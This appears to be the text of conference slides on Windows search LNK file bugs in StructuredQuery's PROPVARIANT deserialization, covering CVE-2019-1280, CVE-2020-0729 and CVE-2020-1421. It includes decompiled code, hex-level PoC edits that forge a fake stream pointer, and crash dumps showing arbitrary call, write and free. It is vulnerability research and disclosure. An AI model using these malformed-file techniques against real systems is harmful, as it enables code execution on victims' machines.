switch ( prop->vt & VT_TYPEMASK ) {
case VT_LPWSTR:
return StructuredQuery1::ReadPWSTR(pstm, &prop->pwszVal);
0x1F = VT_LPWSTR
PropVariant Deserialization
1F 00 07 00 00 00 48 00 49 00 54 00 43 00 4F 00  .......H.I.T.C.O. 
4E 00 6C 00 00 00 00 00 06 00 00 00 00 00 00 00  N................
HRESULT StructuredQuery1::ReadPWSTR(IStream *pstm, LPWSTR pwstr)
{
...
IStream_Read(pstm, &size, 4);
Size = 7
PropVariant Deserialization
1F 00 07 00 00 00 48 00 49 00 54 00 43 00 4F 00 .......H.I.T.C.O.
4E 00 6C 00 00 00 00 00 06 00 00 00 00 00 00 00  N................
HRESULT StructuredQuery1::ReadPWSTR(IStream *pstm, LPWSTR pwstr)
{
...
IStream_Read(pstm, &size, 4);
LPWSTR buf = CoTaskMemAlloc(2 * size);
IStream_Read(pstm, buf, 2 * size - 2);
*pwstr = buf;
Content = L“HITCON”
prop = {
vt = VT_LPWSTR,
pwszVal = L"HITCON"
}
Special Case Everywhere
• VT_DECIMAL is a special case
• DECIMAL has the same size as PROPVARIANT structure
union {
typedef struct {
VARTYPE
vt;
...
union {
CHAR
cVal;
UCHAR
bVal;
...
};
} tag_inner_PROPVARIANT, PROPVARIANT, *LPPROPVARIANT;
DECIMAL decVal;
};
Special Case Everywhere
• MSDN says…
The first member of the DECIMAL structure is not used and is equal in size to the vt member 
of the PROPVARIANT structure.
To put the value of the DECIMAL structure into a PROPVARIANT structure, 
the value must be loaded into the decVal member and the vt member is set to VT_DECIMAL
typedef struct
tagDEC {
USHORT
wReserved;  
BYTE
scale;
BYTE
sign;
ULONG
Hi32;
ULONGLONG
Lo64;
} DECIMAL;
typedef struct {
VARTYPE
vt;
...
...
...
} PROPVARIANT
Special Case Everywhere
• MSDN says…
The first member of the DECIMAL structure is not used and is equal in size to the vt member 
of the PROPVARIANT structure.
To put the value of the DECIMAL structure into a PROPVARIANT structure, 
the value must be loaded into the decVal member and the vt member is set to VT_DECIMAL
typedef struct
tagDEC {
USHORT
wReserved;  
BYTE
scale;
BYTE
sign;
ULONG
Hi32;
ULONGLONG
Lo64;
} DECIMAL;
typedef struct {
VARTYPE
vt;
...
...
...
} PROPVARIANT
CVE-2019-1280
• ReadPROPVARIANT read DECIMAL from file without resetting vt to VT_DECIMAL
• Which means we can control the type of a PROPVARIANT object
• Type Confusion
HRESULT StructuredQuery1::ReadPROPVARIANT(IStream *pstm, PROPVARIANT *prop) 
{
IStream_Read(pstm, &prop->vt, 2);
...
VARTYPE vt = prop->vt & VT_TYPEMASK;
switch ( vt ) {
...
case VT_DECIMAL:
return IStream_Read(pstm, &prop->decVal, 16); // without setting vt to VT_DECIMAL
...
}
prop->vt is overwritten 
Special Case Everywhere
• Obviously, Microsoft Engineers didn’t read MSDN
CVE-2019-1280 PoC
2B30h: 00 1F 00 08 00 00 00 63 00 6F 00 6E 00 74 00 72 .......c.o.n.t.r
2B40h: 00 6F 00 6C 00 00 00 00 00 06 00 00 00 65 00 6E  .o.l.........e.n
VARTYPE = 0x1F (VT_LPWSTR)
Size
= 8
Content = L“Control”
• Forge an IStream object by overwriting vt to VT_STREAMED_OBJECT
• Modify the serialized data in a search LNK
2B30h: 00 0E 00 44 00 00 00 00 00 00 00 AA AA AA AA BB ...D.......ªªªª» 
2B40h: BB BB BB 6C 00 00 00 00 00 06 00 00 00 65 00 6E  »»»l.........e.n
VARTYPE = 0x0E (VT_DECIMAL)
Fake PROPVARIANT in the DECIMAL Data:
VARTYPE = 0x44 (VT_STREAMED_OBJECT)
Reserved
Fake IStream Object Pointer = 0xbbbbbbbbaaaaaaaa
BEFORE
AFTER
CVE-2019-1280
• ReadPROPVARIANT doesn’t support ISteam object desearialization
• But it still use PropVariantClear to release the PropVariant
• Hijack the control flow when system try to release our PropVariant
HRESULT PropVariantClearWorker(PROPVARIANT *pvarg, int fInternal)
{
...
switch ( pvarg->vt ) {
case VT_STREAMED_OBJECT:
...
IStream* pStream = pvarg->pStream; // Release(pStream); //  dx -r1 ((combase!tagPROPVARIANT *)pvarg)
((combase!tagPROPVARIANT *)pvarg) : 0x137fe838 : STREAMED_OBJECT = {...} [Type: tagPROPVARIANT *]
[]     [Type: tagPROPVARIANT]
STREAMED_OBJECT  : 0xbbbbbbbbaaaaaaaa [Type: IStream *]
vt
: 0x44 [Type: unsigned short]
• Type Confusion leads to Arbitrary Call
CVE-2020-0729
• CLSID and CLIPDATA in PROPVARIANT are pointers
• Memory must be allocated before reading the data
union {
...
CLSID
*puuid;
CLIPDATA
*pclipdata;
...
};
CVE-2020-0729
HRESULT StructuredQuery1::ReadPROPVARIANT(IStream *pstm, PROPVARIANT *prop)
{
HRESULT hr = IStream_Read(pstm, &prop->vt, 2);
...
switch ( vt ) {
...
case VT_CLSID:
CLSID **ppuuid = &prop->puuid;
// puuid is a NULL pointer
return IStream_Read(pstm, *ppuuid, 16); // vt, 2);
...
switch ( vt ) {
...
case VT_CF:
CLIPDATA **ppclipdata = &prop->pclipdata; // pclipdata is a NULL Pointer
hr = IStream_Read(pstm, &(*ppclipdata)->ulClipFmt, 4); puuid / prop->pclipdata are always NULL
• Just a DoS?
• Not even, IStream_Read won’t read to NULL Pointer
HRESULT StructuredQuery1::ReadPROPVARIANT(IStream *pstm, PROPVARIANT *prop) 
CVE-2020-0729
• Uninitialized Memory in case VT_VARIANT
• We can call ReadPROPVARIANT again with uninitialized puuid / pclipdata
HRESULT StructuredQuery1::ReadPROPVARIANT(IStream *pstm, PROPVARIANT *prop) {
...
case VT_VARIANT:
PROPVARIANT* var = CoTaskMemAlloc(sizeof(PROPVARIANT)); // Uninitialized buffer
prop->pvarVal = var;
// var->puuid points to uninitialized buffer
hr = StructuredQuery1::ReadPROPVARIANT(pstm, var);
...
CVE-2020-0729
• Combine 2 bugs: Uninitialized Memory + Invalid Pointer Dereference
• Leads to Arbitrary Write
• Write 16 bytes to a controlled address with heap spray
ucrtbase!memcpy+0xf9:
00007ff8`5fe14ea9 f30f7f00        movdqu  xmmword ptr [rax],xmm0 
ds:0074006e`006f0063=????????????????????????????????
0:003> ?xmm0
Evaluate expression: -6148914691236517206 = aaaaaaaa`aaaaaaaa
No more bugs!
• ReadPROPVARIANT is only 300+ lines
• I have reversed every line of code and checked multiple times
There are no more bugs!
No more bugs!
• ReadPROPVARIANT is only 300+ lines
• I have reversed every line of code and checked multiple times
There are no more bugs!
• My Fuzzer:
CVE-2020-1421
• ReadPROPVAIRNAT also supports vector deserialization
• If the type is VT_XXX | VT_VECTOR, then read it as a vector
• e.g.
case VT_BOOL:
if ( (prop->vt & VT_VECTOR) != 0 )
return StructuredQuery1::ReadBlob_short_(pstm, &prop->caui.cElems, &prop->caui.pElems);
return IStream_Read(pstm, &prop->uiVal, 2);
CVE-2020-1421
• When a VT_BSTR_BLOB vector deserialized…
• No matter whether VT_VECTOR is set, it’s read as single VT_BSTR_BLOB
HRESULT StructuredQuery1::ReadPROPVARIANT(IStream *pstm, PROPVARIANT *prop )
{
hr = IStream_Read(pstm, &prop->vt, 2); // prop.vt = VT_BSTR_BLOB | VT_VECTOR
... 
vt = prop & VT_TYPEMASK;
// vt = VT_BSTR_BLOB
if ( vt == VT_BSTR_BLOB ) // check with masked type
StructuredQuery1::ReadBlob_unsigned_char_(
pstm, &prop->bstrblobVal.cbSize, &prop->bstrblobVal.pData);
// read our size and data to an allocated buffer
...
}
CVE-2020-1421
• But when it was about to be released...
• It’s still treat as a VECTOR, because vt is still VT_BSTR_BLOB | VT_VECTOR
HRESULT PropVariantClearWorker(PROPVARIANT *pvarg, int fInternal )
{
...
if ( vt == VT_BSTR_BLOB | VT_VECTOR ) {
if ( pvarg->cabstrblob.pElems ) {
i = 0;
if ( pvarg->cabstrblob.cElems > 0 ) {
do {
if ( prop->cabstrblob.pElems[i].pData )
CoTaskMemFree(prop->cabstrblob.pElems[i++].pData);
// ^ take a pointer from our controlled data, and free it
} while ( i cabstrblob.cElems );
}
}
CVE-2020-1421
Critical error detected c0000374
(517c.189c): Break instruction exception - code 80000003 (first chance)
ntdll!RtlReportCriticalFailure+0x56:
00007fff`d9cd9232 cc              int     3
0:083> k
Child-SP          RetAddr
Call Site
00000000`07a2ce10 00007fff`d9ce1662 ntdll!RtlReportCriticalFailure+0x56
00000000`07a2cf00 00007fff`d9ce196a ntdll!RtlpHeapHandleError+0x12
00000000`07a2cf30 00007fff`d9cea929 ntdll!RtlpHpHeapHandleError+0x7a
00000000`07a2cf60 00007fff`d9c207df ntdll!RtlpLogHeapFailure+0x45
00000000`07a2cf90 00007fff`d9c1fc11 ntdll!RtlpFreeHeapInternal+0x75f
00000000`07a2d040 00007fff`d990b1d3 ntdll!RtlFreeHeap+0x51
(Inline Function) --------`-------- combase!CoTaskMemFree+0x18
00000000`07a2d080 00007fff`bd98e78e combase!PropVariantClearWorker+0x114753
• Type Confusion leads to Arbitrary Free
Bugs in a single function…
• Arbitrary Call
• Arbitrary Write
• Arbitrary Free
Results
• Remote Code Execution
• CVE-2019-1188 ( Heap Overflow )
• CVE-2019-1280 ( Type Confusion )
• CVE-2020-0729 ( Uninitialized Pointer )
• CVE-2020-1421 ( Type Confusion )
• 10+ Won’t Fix Denial of Service
• Any of them could destroy your desktop
More LNK bugs has been found
CVE-2019-1280
CVE-2020-0684
Type Confusion in
StructureQuery.dll
By Lays
Heap Overflow in
Windows.storage.dll
By Wayne Low
2019 09
2020 03
CVE-2019-1188
CVE-2019-0729
CVE-2020-1299
Heap Overflow in
Windows.storage.dll
By Lays
Uninitialized Pointer
in StructureQuery.dll
By Lays
Use After Free in
Windows.storage.dll
By Lê Hữu Quang Linh
2019  08
2020 02
2020 06
CVE-2020-1421
Type Confusion in
StructureQuery.dll
By Lays / expand20
2020 07
!exploitable
• Exploit is hard under Windows ASLR
• But not impossible
• Bypass ASLR with third party Shell Extension without DYNAMICBASE
• Maybe possible to combine with Windows Search / StructuredQuery?
DEMO
Conclusion
• I love Microsoft
• Windows is complicated
• Lack of comprehensive testing
• Some code may not even be run
• Still lots of component to dig
• File format based exploit is hard nowadays, but not impossible
• Check Samsung MMS exploit of Project Zero
Thanks
• Shih-Kun Huang of NCTU SQLab 
• Lucas Leong (@_wmliang_)
• TeamT5
• MSRC
Thank You
@_L4ys